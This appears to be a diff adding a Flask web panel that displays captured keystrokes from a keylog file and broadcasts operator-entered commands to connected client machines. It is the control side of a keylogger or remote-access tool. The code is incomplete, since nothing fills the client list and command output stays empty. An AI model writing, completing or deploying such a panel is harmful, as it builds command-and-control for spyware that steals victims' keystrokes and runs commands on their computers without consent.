@@ -1,0 +1,45 @@
+
+from flask import Flask, render_template, request, redirect, url_for
+import socket
+import threading
+import time
+
+app = Flask(__name__)
+
+clients = []
+
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+@app.route("/display")
+def display():
+    return render_template("display.html")
+
+@app.route("/keylogger")
+def keylogger():
+    try:
+        with open("keylog.txt", "r", encoding="utf-8", errors="ignore") as f:
+            logs = f.read()
+    except FileNotFoundError:
+        logs = "No keylogs yet."
+    return render_template("keylogger.html", logs=logs)
+
+@app.route("/command", methods=["GET", "POST"])
+def command():
+    output = ""
+    if request.method == "POST":
+        cmd = request.form["cmd"]
+        for client in clients:
+            try:
+                client.send(f"CMD: {cmd}".encode())
+            except:
+                pass
+        time.sleep(1)
+    return render_template("command.html", output=output)
+
+def run_flask():
+    app.run(host="0.0.0.0", port=5000)
+
+if __name__ == "__main__":
+    run_flask()
